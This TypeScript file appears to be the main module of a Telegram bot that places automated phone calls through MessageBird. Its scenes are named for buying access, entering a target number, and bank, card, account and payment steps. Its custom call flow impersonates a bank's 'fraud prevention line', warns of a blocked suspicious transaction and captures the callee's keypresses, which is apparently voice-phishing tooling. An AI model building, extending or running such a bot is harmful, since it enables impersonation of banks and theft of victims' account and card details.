/* eslint-disable @typescript-eslint/no-explicit-any */
// eslint-disable-next-line @typescript-eslint/no-var-requires
require('dotenv').config();
import { v4 as uuidv4 } from 'uuid';

import './server';

import { Telegraf, Scenes } from 'telegraf';
import { accountStepScene } from './scenes/AccountStep';
import { bankStepScene } from './scenes/BankStep';
import { buyScene } from './scenes/Buy';
import { callOnNumInputScene } from './scenes/CallOnNumInput';
import { cardStepScene } from './scenes/CardStep';
import { payStepScene } from './scenes/PayStep';
import { startScene } from './scenes/Start';
import { superWizard } from './scenes/SuperWizardScene';
import LocalSession from 'telegraf-session-local';
import { messagebird } from './utils/messagebird';

const params = {
  id: '9e568623-a158-45f5-aa71-d877349abafc',
  title: 'XML Call flow',
  record: false,
  steps: [
    {
      id: '800a9655-92b0-4f80-bdf7-63d5c7650ec6',
      action: 'say',
      options: {
        payload: 'Hello! Press 1, 2, or 3 to continue.',
        language: 'en-US',
        voice: 'male',
      },
      onKeypressGoto: 'bar',
      onKeypressVar: 'foo',
    },
    {
      id: '71090bab-0683-438b-af57-490d7cdb94c8',
      action: 'pause',
      options: {
        length: 10,
      },
      onKeypressGoto: 'bar',
      onKeypressVar: 'foo',
    },
    {
      id: '184019d3-5f58-4e7a-a770-cd1401440367',
      action: 'say',
      options: {
        payload: "You didn't press anything. Good bye!",
        language: 'en-US',
        voice: 'male',
      },
    },
    {
      id: '3b903119-821e-4e4f-baa3-83beb898f427',
      action: 'hangup',
    },
    {
      id: 'bar',
      action: 'say',
      options: {
        payload: 'You pressed 1. Bye!',
        language: 'en-US',
        voice: 'female',
      },
      conditions: [
        {
          variable: 'foo',
          operator: '==',
          value: '1',
        },
      ],
    },
    {
      id: '8570f016-c27c-44c1-9327-236df34684d3',
      action: 'hangup',
      conditions: [
        {
          variable: 'foo',
          operator: '==',
          value: '1',
        },
      ],
    },
    {
      id: 'a5fadcfd-1c2a-4017-9e5a-72c5e4df8007',
      action: 'say',
      options: {
        payload: 'You pressed 2. Bye!',
        language: 'en-US',
        voice: 'male',
      },
      conditions: [
        {
          variable: 'foo',
          operator: '==',
          value: '2',
        },
      ],
    },
    {
      id: 'a144f0e6-3702-4990-a63e-27d497ef801b',
      action: 'hangup',
      conditions: [
        {
          variable: 'foo',
          operator: '==',
          value: '2',
        },
      ],
    },
    {
      id: '4c6f803b-2e2f-458d-94a6-6698d53b0cc7',
      action: 'say',
      options: {
        payload: 'You pressed 3. Bye!',
        language: 'en-US',
        voice: 'male',
      },
      conditions: [
        {
          variable: 'foo',
          operator: '==',
          value: '3',
        },
      ],
    },
    {
      id: 'a9bbba8b-ed1b-4fa4-bdae-85c668723103',
      action: 'hangup',
      conditions: [
        {
          variable: 'foo',
          operator: '==',
          value: '3',
        },
      ],
    },
    {
      id: '38eb5a4c-3a2a-4475-a056-e8ece4e57e17',
      action: 'say',
      options: {
        payload: "You pressed something, but it wasn't 1, 2 or 3. Bye!",
        language: 'en-US',
        voice: 'male',
      },
    },
  ],
};

const customFlow = {
  id: uuidv4(),
  title: `call bank - 1111111`,
  record: false,
  steps: [
    {
      id: uuidv4(),
      action: 'say',
      options: {
        payload: `This is a call from Me fraud prevention line. We have BLOCKED a recent SUSPICIOUS transaction on your account. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
        language: 'en-US',
        voice: 'female',
      },
      onKeypressGoto: 'bankStepGoto',
      onKeypressVar: 'dtmf',
    },
    {
      id: uuidv4(),
      action: 'pause',
      options: {
        length: 10,
      },
      onKeypressGoto: 'bankStepGoto',
      onKeypressVar: 'dtmf',
    },
    {
      id: uuidv4(),
      action: 'say',
      options: {
        payload: "You didn't press anything. Good bye!",
        language: 'en-US',
        voice: 'female',
      },
    },
    {
      id: uuidv4(),
      action: 'hangup',
    },
    {
      id: 'bankStepGoto',
      action: 'fetchCallFlow',
      options: {
        url: `${process.env.ENDPOINT_URL}/calls/dtmf/en-US/bank/1111111`,
      },
    },
  ],
};

// messagebird.calls.create(
//   {
//     source: '18009359935',
//     destination: '16172752394',
//     // @ts-expect-error ignore
//     callFlow: customFlow,
//   },
//   (err, res) => {
//     if (err) {
//       console.log(err);
//       return;
//     }
//     console.log(res);
//   },
// );

const token = process.env.BOT_TOKEN;
if (token === undefined) {
  throw new Error('BOT_TOKEN must be provided!');
}

export const bot = new Telegraf<Scenes.WizardContext>(token);
const stage = new Scenes.Stage<Scenes.WizardContext>(
  [
    superWizard,
    buyScene as any,
    callOnNumInputScene,
    startScene,
    bankStepScene,
    payStepScene,
    accountStepScene,
    cardStepScene,
  ],
  {
    default: 'super-wizard',
  },
);

stage.start(async (ctx) => {
  return ctx.scene.enter('START_ID');
});

stage.action('call', async (ctx) => {
  return ctx.scene.enter('START_ID');
});

stage.action('cancel', async (ctx) => {
  await ctx.reply('Operation cancelled successfully ✅');
  return ctx.scene.enter('super-wizard');
});

stage.command('cancel', async (ctx) => {
  await ctx.reply('Operation cancelled successfully ✅');
  return ctx.scene.enter('super-wizard');
});

// bot.use(Telegraf.log());
bot.use(new LocalSession().middleware());
bot.use(stage.middleware());
bot.catch((err) => {
  // eslint-disable-next-line no-console
  console.log(err);
});
bot.launch();

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
